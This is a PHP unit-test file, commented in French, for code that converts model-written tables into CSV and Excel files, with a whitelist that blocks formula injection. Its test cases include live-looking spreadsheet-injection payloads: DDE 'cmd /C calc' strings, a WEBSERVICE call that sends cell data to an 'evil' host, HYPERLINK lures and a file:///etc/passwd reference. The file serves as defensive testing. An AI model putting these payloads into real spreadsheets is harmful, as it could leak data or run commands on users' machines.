<?php

declare(strict_types=1);

use PHPUnit\Framework\TestCase;

/**
 * Tableau écrit par un modèle → classeur : les trois analyses PURES qui
 * décident du contenu d'un fichier Excel ou CSV, sans aucune bibliothèque.
 *
 *  - TabularData        : lignes et cellules (séparateur deviné, guillemets,
 *                         table Markdown, formules non citées) ;
 *  - SpreadsheetCell    : nombre, pourcentage, montant, date — ou texte ;
 *  - SpreadsheetFormula : formules conservées (liste blanche) et cellules
 *                         neutralisées (injection de formule).
 *
 * Le jeu de cas `tests/Fixtures/tabular-cases.json` est PARTAGÉ avec le
 * JavaScript (GeneratedFilesJsTest) : l'aperçu de la carte et le classeur
 * fabriqué doivent découper un tableau de la même façon.
 */
final class TabularDataTest extends TestCase
{
    // ------------------------------------------------------------ tableau

    /** @return list<array{name: string, source: string, rows: list<list<string>>}> */
    public static function casPartages(): array
    {
        $cas = json_decode((string)file_get_contents(ROOT . '/tests/Fixtures/tabular-cases.json'), true);
        if (!is_array($cas) || $cas === []) {
            self::fail('Jeu de cas tabulaires illisible.');
        }

        return $cas;
    }

    public function testLeJeuDeCasPartageEstRespecte(): void
    {
        foreach (self::casPartages() as $cas) {
            $this->assertSame(
                $cas['rows'],
                TabularData::parse($cas['source'])->rows(),
                'Cas « ' . $cas['name'] . ' »'
            );
        }
    }

    /**
     * Réécrire un tableau en CSV puis le relire rend le même tableau : c'est
     * ce qui garantit qu'un CSV téléchargé se rouvre à l'identique, guillemets,
     * séparateurs cités et sauts de ligne compris.
     */
    public function testLaReecritureEnCsvEstStable(): void
    {
        foreach (self::casPartages() as $cas) {
            $table = TabularData::parse($cas['source']);
            $csv   = $table->toCsv(null, "\n", false);

            $this->assertSame(
                $table->rows(),
                TabularData::parse($csv)->rows(),
                'Cas « ' . $cas['name'] . ' » : ' . json_encode($csv, JSON_UNESCAPED_UNICODE)
            );
        }
    }

    public function testToutesLesLignesOntLeMemeNombreDeCellules(): void
    {
        foreach (self::casPartages() as $cas) {
            $table = TabularData::parse($cas['source']);
            foreach ($table->rows() as $ligne) {
                $this->assertCount($table->columnCount(), $ligne, 'Cas « ' . $cas['name'] . ' »');
            }
            $this->assertSame(count($cas['rows']), $table->rowCount());
        }
    }

    public function testSourceVide(): void
    {
        foreach (['', "  \n\n\t ", "\xEF\xBB\xBF"] as $source) {
            $table = TabularData::parse($source);
            $this->assertTrue($table->isEmpty());
            $this->assertSame(0, $table->rowCount());
            $this->assertSame(0, $table->columnCount());
            $this->assertFalse($table->hasHeader());
            $this->assertSame('', $table->toCsv());
        }
    }

    public function testSeparateurDevine(): void
    {
        $this->assertSame(';', TabularData::detectDelimiter("a;b;c\n1;2;3"));
        $this->assertSame(',', TabularData::detectDelimiter("a,b\n1,2"));
        $this->assertSame("\t", TabularData::detectDelimiter("a\tb\n1\t2"));
        $this->assertSame('|', TabularData::detectDelimiter("a | b\n1 | 2"));
        $this->assertSame('', TabularData::detectDelimiter("pomme\npoire"));
    }

    /**
     * Le piège classique : un CSV français à point-virgule dont les nombres
     * portent une virgule décimale. La virgule est sur presque chaque ligne —
     * pas sur l'en-tête : c'est la RÉGULARITÉ qui tranche, pas le nombre
     * d'occurrences.
     */
    public function testLaVirguleDecimaleNeTrompePasLaDetection(): void
    {
        $source = "Produit;Prix;Remise\nA;1,5;0,1\nB;2,5;0,2\nC;3,25;0,3\nD;4,75;0,4";

        $this->assertSame(';', TabularData::detectDelimiter($source));
        $this->assertSame(['A', '1,5', '0,1'], TabularData::parse($source)->rows()[1]);
    }

    /** À régularité égale, le plus grand nombre de colonnes l'emporte. */
    public function testARegulariteEgaleLePlusDeColonnes(): void
    {
        $source = "Nom;Adresse, Ville;Âge\nZoé;1 rue A, Nantes;31\nAlex;2 rue B, Lyon;42";

        $this->assertSame(';', TabularData::detectDelimiter($source));
        $this->assertSame(3, TabularData::parse($source)->columnCount());
    }

    public function testSeparateurDeReecriture(): void
    {
        $this->assertSame(';', TabularData::parse("a;b\n1;2")->delimiter());
        $this->assertSame(',', TabularData::parse("a,b\n1,2")->delimiter(), 'Le séparateur demandé par l’utilisateur est conservé.');
        $this->assertSame("\t", TabularData::parse("a\tb\n1\t2")->delimiter());
        // Barres verticales, colonne unique, table Markdown : point-virgule.
        $this->assertSame(';', TabularData::parse("a | b\n1 | 2")->delimiter());
        $this->assertSame(';', TabularData::parse("pomme\npoire")->delimiter());
        $this->assertSame(';', TabularData::parse("| a | b |\n|---|---|\n| 1 | 2 |")->delimiter());
    }

    public function testLigneDEnTetes(): void
    {
        $this->assertTrue(TabularData::parse("Mois;CA;Marge\nJanvier;1200;8 %")->hasHeader());
        // Des nombres ou des dates en première ligne : ce sont des données.
        $this->assertFalse(TabularData::parse("2024;12;8\n2025;15;9")->hasHeader());
        $this->assertFalse(TabularData::parse("2026-01-01;Férié\n2026-05-01;Férié")->hasHeader());
        // Une seule ligne : rien à distinguer.
        $this->assertFalse(TabularData::parse('Mois;CA')->hasHeader());
        // Première ligne entièrement vide.
        $this->assertFalse(TabularData::parse("\"\";\"\"\n1;2")->hasHeader());
        // Cellules vides tolérées dans un en-tête.
        $this->assertTrue(TabularData::parse("Nom;;Ville\nZoé;x;Nantes")->hasHeader());
    }

    public function testTableMarkdown(): void
    {
        $table = TabularData::parse(
            "| Poste | Montant | Note |\n|:------|--------:|:----:|\n| **Loyer** | 1 200 € | ligne 1<br>ligne 2 |\n| *Total* | `=B2` | a \\| b |\n\nTexte après la table."
        );

        $this->assertTrue($table->isFromMarkdown());
        $this->assertTrue($table->hasHeader(), 'Une table Markdown a toujours un en-tête.');
        $this->assertSame(
            [
                ['Poste', 'Montant', 'Note'],
                ['Loyer', '1 200 €', "ligne 1\nligne 2"],
                ['Total', '=B2', 'a | b'],
            ],
            $table->rows()
        );
    }

    public function testUneLigneABarresSansTiretsNEstPasUneTableMarkdown(): void
    {
        $table = TabularData::parse("a | b\n1 | 2");

        $this->assertFalse($table->isFromMarkdown());
        $this->assertSame([['a', 'b'], ['1', '2']], $table->rows());
        $this->assertNull(TabularData::parseMarkdownTable("Titre\n-----\ntexte"));
    }

    /**
     * Les modèles écrivent `=SI(A1>0;"oui";"non")` sans guillemets autour,
     * dans un CSV dont le point-virgule est justement le séparateur.
     */
    public function testUneFormuleNonCiteeGardeSesSeparateurs(): void
    {
        $table = TabularData::parse("Poste;Verdict;Total\nA;=SI(B2>0;\"oui\";\"non\");=SOMME(C2:C9)\nB;=ARRONDI(C3*1,2;2);5");

        $this->assertSame(
            [
                ['Poste', 'Verdict', 'Total'],
                ['A', '=SI(B2>0;"oui";"non")', '=SOMME(C2:C9)'],
                ['B', '=ARRONDI(C3*1,2;2)', '5'],
            ],
            $table->rows()
        );
    }

    /** Borné à la ligne : une parenthèse jamais refermée n'avale pas le reste du fichier. */
    public function testUneFormuleOuverteNeDebordePasDeSaLigne(): void
    {
        $table = TabularData::parse("a;=SOMME(B1;b\nc;d;e");

        $this->assertSame(2, $table->rowCount());
        $this->assertSame(['c', 'd', 'e'], $table->rows()[1]);
    }

    public function testReecritureCsvConforme(): void
    {
        $table = TabularData::parse("Nom;Note\n\"Dupont; Jean\";\"Il a dit \"\"oui\"\"\"\n\"Multi\nligne\";\" bord \"");

        $this->assertSame(
            "Nom;Note\r\n\"Dupont; Jean\";\"Il a dit \"\"oui\"\"\"\r\n\"Multi\nligne\";\" bord \"\r\n",
            $table->toCsv()
        );
        // Séparateur imposé (fichier .tsv) : les guillemets suivent le nouveau séparateur.
        $this->assertSame(
            "Nom\tNote\nDupont; Jean\t\"Il a dit \"\"oui\"\"\"\n\"Multi\nligne\"\t\" bord \"\n",
            $table->toCsv("\t", "\n")
        );
    }

    /** Un CSV est presque toujours ouvert dans un tableur : rien ne doit s'y exécuter. */
    public function testLeCsvNeutraliseLesCellulesExecutables(): void
    {
        $table = TabularData::parse("Lien;Total;Tel\n=HYPERLINK(\"http://evil\");=SOMME(B2:B3);+33 (0)6 12 34 56 78");
        $csv   = $table->toCsv(';', "\n");

        $this->assertStringContainsString("\"'=HYPERLINK(\"\"http://evil\"\")\"", $csv);
        $this->assertStringContainsString(';=SOMME(B2:B3);', $csv, 'Une formule sûre reste une formule.');
        $this->assertStringContainsString(';+33 (0)6 12 34 56 78', $csv, 'Un numéro de téléphone n’est pas défiguré.');

        // Sans neutralisation (aperçu, relecture) : le contenu exact.
        $this->assertStringContainsString('"=HYPERLINK(""http://evil"")"', $table->toCsv(';', "\n", false));
    }

    public function testTableauTropGrand(): void
    {
        try {
            TabularData::parse(str_repeat("a;b\n", TabularData::MAX_ROWS + 1));
            $this->fail('Un tableau au-delà du plafond de lignes doit être refusé.');
        } catch (FileBuildException $e) {
            $this->assertSame(FileBuildException::TOO_LARGE, $e->kind());
            $this->assertSame(413, $e->httpStatus());
        }

        try {
            TabularData::parse(implode(';', array_fill(0, TabularData::MAX_COLS + 1, 'x')) . "\n" . implode(';', array_fill(0, TabularData::MAX_COLS + 1, '1')));
            $this->fail('Un tableau au-delà du plafond de colonnes doit être refusé.');
        } catch (FileBuildException $e) {
            $this->assertSame(FileBuildException::TOO_LARGE, $e->kind());
        }

        // Juste sous le plafond : accepté.
        $this->assertSame(TabularData::MAX_ROWS, TabularData::parse(str_repeat("a;b\n", TabularData::MAX_ROWS))->rowCount());
    }

    // ------------------------------------------------------------ cellules

    /**
     * La règle de retenue : dans le doute, c'est du texte. L'erreur inverse
     * détruit la donnée en silence.
     */
    public function testCeQuiRessembleAUnNombreMaisNEnEstPasUn(): void
    {
        $textes = [
            '01000',                               // code postal
            '0612345678',                          // téléphone
            '+33 6 12 34 56 78',
            'REF-0042',
            '1234567890123456',                    // 16 chiffres : Excel arrondirait
            'FR76 3000 6000 0112 3456 7890 189',   // IBAN
            '00.5',
            '1,2,3',
            '12 34',
            '1.2.3',
            'v2',
            '3 pommes',
            '2026-13-01',                          // mois impossible
            '31/02/2026',                          // jour impossible
            '1899-12-31',                          // avant la plage sûre d'Excel
            '12:30',
        ];
        foreach ($textes as $brut) {
            $cellule = SpreadsheetCell::classify($brut);
            $this->assertSame(SpreadsheetCell::TEXT, $cellule['type'], "« $brut » doit rester du texte.");
            $this->assertSame($brut, $cellule['value']);
            $this->assertFalse(SpreadsheetCell::isNumeric($brut));
        }
    }

    public function testCelluleVide(): void
    {
        foreach (['', '   ', "\u{00A0}"] as $brut) {
            $this->assertSame(['type' => SpreadsheetCell::BLANK, 'value' => ''], SpreadsheetCell::classify($brut));
        }
    }

    public function testNombres(): void
    {
        $cas = [
            // brut                 => [valeur, masque]
            '42'                    => [42, ''],
            '0'                     => [0, ''],
            '-7'                    => [-7, ''],
            '+7'                    => [7, ''],
            '3.14'                  => [3.14, '0.00'],
            '-150,75'               => [-150.75, '0.00'],
            '0,5'                   => [0.5, '0.0'],
            '1 200'                 => [1200, '#,##0'],
            '1 234 567,89'          => [1234567.89, '#,##0.00'],
            "1\u{00A0}200"          => [1200, '#,##0'],
            "1\u{202F}200,5"        => [1200.5, '#,##0.0'],
            '1,234.50'              => [1234.5, '#,##0.00'],
            '1,234,567'             => [1234567, '#,##0'],
            '1.234,50'              => [1234.5, '#,##0.00'],
            '1.234.567'             => [1234567, '#,##0'],
            "1'234.50"              => [1234.5, '#,##0.00'],
            "\u{2212}5"             => [-5, ''],
            '1e3'                   => [1000.0, ''],
            '123456789012345'       => [123456789012345, ''],
        ];
        foreach ($cas as $brut => [$valeur, $masque]) {
            $cellule = SpreadsheetCell::classify((string)$brut);
            $this->assertSame(SpreadsheetCell::NUMBER, $cellule['type'], "« $brut »");
            $this->assertSame($valeur, $cellule['value'], "« $brut »");
            $this->assertSame($masque, $cellule['format'], "Masque de « $brut »");
        }
    }

    /** « 1,234 » : 1,234 en français, mille deux cent trente-quatre en anglais. */
    public function testLaLangueTrancheLaVirguleAmbigue(): void
    {
        $fr = SpreadsheetCell::classify('1,234', 'fr');
        $this->assertSame(1.234, $fr['value']);
        $this->assertSame('0.000', $fr['format']);

        $en = SpreadsheetCell::classify('1,234', 'en');
        $this->assertSame(1234, $en['value']);
        $this->assertSame('#,##0', $en['format']);

        // Sans ambiguïté, la langue ne change rien.
        $this->assertSame(1.5, SpreadsheetCell::classify('1,5', 'en')['value']);
        $this->assertSame(0.234, SpreadsheetCell::classify('0,234', 'en')['value']);
    }

    public function testPourcentages(): void
    {
        $this->assertSame(
            ['type' => SpreadsheetCell::PERCENT, 'value' => 0.125, 'format' => '0.0%'],
            SpreadsheetCell::classify('12,5 %')
        );
        $this->assertSame(
            ['type' => SpreadsheetCell::PERCENT, 'value' => 0.2, 'format' => '0%'],
            SpreadsheetCell::classify('20%')
        );
        $this->assertSame(-0.05, SpreadsheetCell::classify("-5\u{00A0}%")['value']);
        $this->assertSame(SpreadsheetCell::TEXT, SpreadsheetCell::classify('environ 20 %')['type']);
    }

    public function testMontants(): void
    {
        $this->assertSame(
            ['type' => SpreadsheetCell::CURRENCY, 'value' => 1200.0, 'format' => '#,##0.00 "€"'],
            SpreadsheetCell::classify('1 200,00 €')
        );
        $this->assertSame(
            ['type' => SpreadsheetCell::CURRENCY, 'value' => 3800, 'format' => '#,##0 "€"'],
            SpreadsheetCell::classify("3\u{202F}800\u{00A0}€")
        );
        $this->assertSame(
            ['type' => SpreadsheetCell::CURRENCY, 'value' => 1200.5, 'format' => '"$"#,##0.00'],
            SpreadsheetCell::classify('$1,200.50')
        );
        $this->assertSame(-5, SpreadsheetCell::classify('-$5')['value']);
        $this->assertSame(12, SpreadsheetCell::classify('€ 12')['value']);
        $this->assertSame('#,##0 "EUR"', SpreadsheetCell::classify('15 EUR')['format']);
        $this->assertTrue(SpreadsheetCell::isNumeric('1 200 €'));
        $this->assertSame(SpreadsheetCell::TEXT, SpreadsheetCell::classify('12 € TTC')['type']);
    }

    public function testDates(): void
    {
        // Repère connu : le 1er janvier 2024 porte le numéro 45292 dans Excel.
        $this->assertSame(45292.0, SpreadsheetCell::excelSerial(2024, 1, 1));
        $serie = 46295.0;   // 30 septembre 2026

        $this->assertSame(
            ['type' => SpreadsheetCell::DATE, 'value' => $serie, 'format' => 'yyyy-mm-dd'],
            SpreadsheetCell::classify('2026-09-30')
        );
        $this->assertSame(
            ['type' => SpreadsheetCell::DATE, 'value' => $serie, 'format' => 'dd/mm/yyyy'],
            SpreadsheetCell::classify('30/09/2026', 'fr')
        );
        $this->assertSame(
            ['type' => SpreadsheetCell::DATE, 'value' => $serie, 'format' => 'mm/dd/yyyy'],
            SpreadsheetCell::classify('09/30/2026', 'en')
        );
        // Ordre impossible dans la langue : l'autre ordre est retenu.
        $this->assertSame('dd/mm/yyyy', SpreadsheetCell::classify('25/12/2026', 'en')['format']);
        $this->assertSame('mm/dd/yyyy', SpreadsheetCell::classify('12/25/2026', 'fr')['format']);
        // « 03/04/2026 » : 3 avril pour un francophone, 4 mars pour un anglophone.
        $this->assertSame(
            SpreadsheetCell::excelSerial(2026, 4, 3),
            SpreadsheetCell::classify('03/04/2026', 'fr')['value']
        );
        $this->assertSame(
            SpreadsheetCell::excelSerial(2026, 3, 4),
            SpreadsheetCell::classify('03/04/2026', 'en')['value']
        );
    }

    public function testDatesAvecHeure(): void
    {
        $cellule = SpreadsheetCell::classify('2026-09-30 14:30');

        $this->assertSame(SpreadsheetCell::DATETIME, $cellule['type']);
        $this->assertSame('yyyy-mm-dd hh:mm', $cellule['format']);
        $this->assertEqualsWithDelta(46295 + 14.5 / 24, $cellule['value'], 1e-9);

        $this->assertSame(SpreadsheetCell::DATETIME, SpreadsheetCell::classify('2026-09-30T08:05:30')['type']);
        $this->assertSame(SpreadsheetCell::TEXT, SpreadsheetCell::classify('2026-09-30 25:00')['type']);
    }

    /** Un fuseau à heure d'été ne doit pas décaler une date d'un jour. */
    public function testLeNumeroDeSerieNeDependPasDuFuseau(): void
    {
        $fuseau = date_default_timezone_get();
        try {
            date_default_timezone_set('Europe/Paris');
            $paris = SpreadsheetCell::excelSerial(2026, 3, 29);
            date_default_timezone_set('America/Los_Angeles');
            $ouest = SpreadsheetCell::excelSerial(2026, 3, 29);
        } finally {
            date_default_timezone_set($fuseau);
        }

        $this->assertSame($paris, $ouest);
        $this->assertSame(floor($paris), $paris, 'Une date sans heure est un numéro entier.');
    }

    public function testBooleens(): void
    {
        foreach (['VRAI', 'vrai', 'true', 'TRUE'] as $brut) {
            $this->assertSame(['type' => SpreadsheetCell::BOOL, 'value' => true], SpreadsheetCell::classify($brut));
        }
        foreach (['FAUX', 'false'] as $brut) {
            $this->assertSame(['type' => SpreadsheetCell::BOOL, 'value' => false], SpreadsheetCell::classify($brut));
        }
        // « oui » / « non » restent du texte : ce sont des réponses, pas des booléens.
        $this->assertSame(SpreadsheetCell::TEXT, SpreadsheetCell::classify('oui')['type']);
    }

    public function testFormulesDansUneCellule(): void
    {
        $this->assertSame(
            ['type' => SpreadsheetCell::FORMULA, 'value' => '=SUM(B2:B9)'],
            SpreadsheetCell::classify(' =SOMME(B2:B9) ')
        );
        // Formule refusée : écrite comme du TEXTE, contenu intact.
        $dangereuse = '=HYPERLINK("http://evil";"cliquez")';
        $this->assertSame(
            ['type' => SpreadsheetCell::TEXT, 'value' => $dangereuse],
            SpreadsheetCell::classify($dangereuse)
        );
    }

    // ------------------------------------------------------------ formules

    public function testFormulesConservees(): void
    {
        $cas = [
            '=SOMME(B2:B9)'                   => '=SUM(B2:B9)',
            '=MOYENNE(C2:C5)'                 => '=AVERAGE(C2:C5)',
            '=SI(A1>0;"oui";"non")'           => '=IF(A1>0,"oui","non")',
            '=ARRONDI(B2*1,2;2)'              => '=ROUND(B2*1.2,2)',
            '=ROUND(B2*1.2,2)'                => '=ROUND(B2*1.2,2)',
            '=SUM(1,2)'                       => '=SUM(1,2)',
            '=MAX(1,5;2)'                     => '=MAX(1.5,2)',
            '=SOMME(1,5;2,25)'                => '=SUM(1.5,2.25)',
            '=1,5*2'                          => '=1.5*2',
            '=B2*C2'                          => '=B2*C2',
            '=$b$2*c2'                        => '=$B$2*C2',
            '=sum(a1:a3)'                     => '=SUM(A1:A3)',
            '=SUM(A:A)'                       => '=SUM(A:A)',
            '=NB.SI(A1:A9;">5")'              => '=COUNTIF(A1:A9,">5")',
            '=AUJOURDHUI()+7'                 => '=TODAY()+7',
            '=CONCATENER("a""b";A1)'          => '=CONCATENATE("a""b",A1)',
            '=SI(A1="x;y";1;2)'               => '=IF(A1="x;y",1,2)',
            '=SI(A1;;2)'                      => '=IF(A1,,2)',
            '=A1*-1'                          => '=A1*-1',
            '=A1*10%'                         => '=A1*10%',
            '=(A1+B1)*2'                      => '=(A1+B1)*2',
            '=-5'                             => '=-5',
            '=A1<>B1'                         => '=A1<>B1',
            '="a"&" "&B1'                     => '="a"&" "&B1',
            '=LOG10(100)'                     => '=LOG10(100)',
            '=RECHERCHEV(A2;D2:E9;2;FAUX)'    => '=VLOOKUP(A2,D2:E9,2,FALSE)',
        ];
        foreach ($cas as $brut => $attendu) {
            $this->assertSame($attendu, SpreadsheetFormula::normalize((string)$brut), "Formule « $brut »");
        }
    }

    /**
     * Liste blanche : tout ce qui sort de la feuille — lien, service web,
     * autre classeur, canal DDE — est écrit comme du texte.
     */
    public function testFormulesRefuseesCarDangereuses(): void
    {
        $cas = [
            '=HYPERLINK("http://evil","cliquez")',
            '=WEBSERVICE("http://evil/?q="&A1)',
            '=IMPORTXML("http://evil","//a")',
            '=INDIRECT("A1")',
            '=cmd|\' /C calc\'!A0',
            '=DDE("cmd";"/C calc";"!A0")',
            '=Feuil2!A1',
            '=[classeur.xlsx]Feuil1!A1',
            "='file:///etc/passwd'#\$passwd.A1",
            '=@SUM(1)',
            '=SUM(A1:A2)+HYPERLINK("http://evil")',
            '=' . str_repeat('1+', 1200) . '1',        // au-delà de la longueur admise
        ];
        foreach ($cas as $brut) {
            $this->assertNull(SpreadsheetFormula::normalize($brut), "« $brut » ne doit pas devenir une formule.");
        }
    }

    /**
     * Une liste blanche de mots ne suffit pas : ces cellules ne contiennent
     * que des jetons admis, mais ne sont pas des calculs. Écrites comme
     * formules, Excel déclarerait le classeur endommagé.
     */
    public function testFormulesRefuseesCarMalFormees(): void
    {
        $cas = [
            '=', '==', '=-', '=+', '=1+', '=A1+', '=> voir note', '= total', '=== Section ===',
            '=2 3', '=A1 B2', '=)', '=(', '=SUM(A1:A3))', '=(A1', '=,', '=%', '=2x', '=1.5.2',
            '=A1(B2)', '=SUM', '=A1;B1', '=A1,B1', '=1;5', '=1,5,2', '=A1,5', '=*2', 'SOMME(A1)', '',
        ];
        foreach ($cas as $brut) {
            $this->assertNull(SpreadsheetFormula::normalize($brut), "« $brut » n'est pas une formule.");
        }
    }

    public function testNeutralisationPourUnCsv(): void
    {
        // Préfixées d'une apostrophe : un tableur les exécuterait.
        $prefixees = [
            '=HYPERLINK("http://x")',
            '=cmd|\' /C calc\'!A0',
            '=-',
            '-SUM(1+1)*cmd|\' /C calc\'!A0',
            '+cmd|\' /C calc\'!A0',
            '@SUM(1+1)',
            '- HYPERLINK ("http://x")',
            '+(HYPERLINK("x"))',
            "\t=cmd|x",
        ];
        foreach ($prefixees as $brut) {
            $this->assertSame("'" . $brut, SpreadsheetFormula::neutralize($brut), "« $brut »");
        }

        // Laissées intactes : elles ne peuvent rien exécuter, et l'apostrophe les défigurerait.
        $intactes = [
            '=SOMME(A1:A2)', '=B2*C2',
            '-150,75', '+12 %', '-5 €', '+33 6 12 34 56 78', '+33 (0)6 12 34 56 78', '+1 (555) 010-9999',
            '- à faire', '-', '@alex', '-(1+2)', 'texte', 'a=b', '', '   ',
        ];
        foreach ($intactes as $brut) {
            $this->assertSame($brut, SpreadsheetFormula::neutralize($brut), "« $brut »");
        }
    }
}
